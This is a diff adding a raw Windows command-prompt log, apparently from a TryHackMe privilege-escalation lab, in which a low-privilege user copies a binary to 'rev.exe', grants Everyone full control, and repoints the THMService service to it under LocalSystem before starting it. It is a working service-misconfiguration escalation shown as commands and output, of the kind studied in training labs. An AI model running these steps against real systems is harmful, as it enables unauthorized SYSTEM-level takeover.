@@ -1,0 +1,44 @@
+C:\tools\AccessChk>copy "C:\Program Files (x86)\SystemScheduler\WService.exe" "C:\Users\thm-unpriv\rev.exe"
+        1 file(s) copied.
+
+C:\tools\AccessChk>icacls C:\Users\thm-unpriv\rev.exe /grant EveryOne:F
+processed file: C:\Users\thm-unpriv\rev.exe
+Successfully processed 1 files; Failed processing 0 files
+
+C:\tools\AccessChk>sc config THMService binpath="C:\Users\thm-unpriv\rev.exe" obj=LocalSystem
+[SC] ChangeServiceConfig SUCCESS
+
+C:\tools\AccessChk>sc qc THMService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: THMService
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Users\thm-unpriv\rev.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : THMService
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+C:\tools\AccessChk>sc stop THMService
+[SC] ControlService FAILED 1062:
+
+The service has not been started.
+
+
+C:\tools\AccessChk>sc start THMService
+
+SERVICE_NAME: THMService
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 2  START_PENDING
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 3464
+        FLAGS              :
+
+C:\tools\AccessChk>
